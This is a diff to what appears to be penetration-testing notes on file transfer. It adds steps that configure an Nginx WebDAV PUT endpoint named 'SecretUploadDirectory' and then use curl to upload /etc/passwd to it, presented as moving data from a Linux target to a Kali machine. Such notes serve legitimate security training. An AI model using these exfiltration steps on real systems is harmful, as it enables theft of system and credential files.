@@ -935,7 +935,26 @@ $ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 - Nginx Uploads (Linux -> Kali)
 
 ```
+$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+# Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
 
+$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+$ sudo systemctl restart nginx.service
+$ tail -2 /var/log/nginx/error.log
+$ ss -lnpt | grep 80
+$ ps -ef | grep <PID>
+$ sudo rm /etc/nginx/sites-enabled/default
+$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
 ```
 
 - PowerShell DownloadFile (Kali -> Windows)
